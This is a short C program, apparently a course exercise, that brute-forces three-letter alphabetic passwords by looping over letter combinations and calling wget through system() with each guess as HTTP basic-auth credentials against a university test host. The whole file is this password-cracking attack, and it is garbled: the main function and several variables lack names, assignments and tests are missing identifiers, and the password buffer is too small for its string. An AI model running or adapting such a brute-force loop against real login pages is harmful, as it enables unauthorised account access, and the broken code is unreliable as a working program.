


#include <stdio.h>

#include <stdlib.h>
int ()
{
  int i,j,k,counter =0;
  char  word[3];
  char paswd[3];	
  char get[100];
  int ;
  char username[]="";
  
  
  
  
  
				
	
	for (i = 65; i <= 122; i++)
	{
		 if(i==91) {i=97;} 
   
		for (j = 65; j <= 122; j++)
		{
		
		if(j==91) {j=97;}
      
		for (k = 65; k <= 122; k++)
		{
		 
			if(k==91) {k=97;}  
			
			 word[0] = i;
			 word[1] = j;
			 word[2] = k;
			 sprintf(paswd,"%c%c%c",word[0],word[1],word[2]);       
			 counter++;
			printf("%d )%s\n\n", counter, paswd);
			 sprintf(get,"wget --http-user=%s --http-passwd=%s http://sec-crack.cs.rmit.edu./SEC/2/",username,paswd);
			=system(get);
	  
			if(==0) 
			{
			printf("The Password has been cracked and it is : %s" , paswd);
			exit(0);
			}
		}
     
		}
  
	}
  
	
}

